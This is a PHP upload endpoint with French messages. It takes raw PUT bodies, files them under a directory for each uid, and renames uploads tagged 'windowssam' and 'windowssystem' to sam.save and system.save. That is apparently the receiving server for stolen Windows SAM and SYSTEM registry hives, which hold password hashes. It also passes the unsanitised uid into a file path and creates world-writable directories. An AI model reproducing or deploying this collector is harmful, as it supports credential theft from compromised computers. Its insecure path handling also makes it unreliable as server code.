<?php
include "../db.php";

$uploadDir = '/uploads';

if ($_SERVER['REQUEST_METHOD'] === 'PUT') {

    $uid = isset($_GET['uid']) ? $_GET['uid'] : null;
    $func_name = isset($_GET['func_name']) ? $_GET['func_name'] : null;
    $params = isset($_GET['params']) ? $_GET['params'] : null;
    $filetype = "normal";

    if (!$uid || !$func_name) {
        echo "Erreur: il manque un ou plusieurs champs dans la requêtte";
        exit;
    }

    $user_dir = realpath(__DIR__ . "/../..") . $uploadDir . '/'. $uid;


    if (!is_dir($user_dir)) {
        mkdir($user_dir, 0777, true);
    } 

    $filename = $uid . "_" . time(); 

    if($func_name == "windowssam"){
        $filename =  "sam.save";
        $filetype = "regedit";
    } elseif ($func_name == "windowssystem"){
        $filename =  "system.save";
        $filetype = "regedit";
    }

    $filePath = $user_dir . "/" . $filename;

    $file = fopen("php://input", "rb");
    if ($file) {
        $newFile = fopen($filePath, "wb");
        if ($newFile) {
            while (!feof($file)) {
                fwrite($newFile, fread($file, 1024));
            }
            fclose($newFile);
    

            if (filesize($filePath) === 0) {
                // Si le fichier est vide, le supprimer
                unlink($filePath);
                http_response_code(400); 
                echo "Erreur : Le fichier est vide.";
                return;
            }
    
            $sql = "INSERT INTO upload_files(uid, filename, filepath, file_type) VALUES(?,?,?,?)";
            $stmt = $conn->prepare($sql);
            $stmt->bind_param("ssss", $uid, $filename, $filePath, $filetype);
            $stmt->execute();
    
            echo "Fichier reçu et enregistré sous : " . $filename;
        } else {
            http_response_code(500);
            echo "Erreur lors de l'écriture du fichier.\n" . $filePath;
        }
        fclose($file);
    } else {
        http_response_code(400);
        echo "Erreur : Aucune donnée reçue.";
    }
    
    
} else{
    echo 'Erreur: Type de requette non autorisé';
}

?>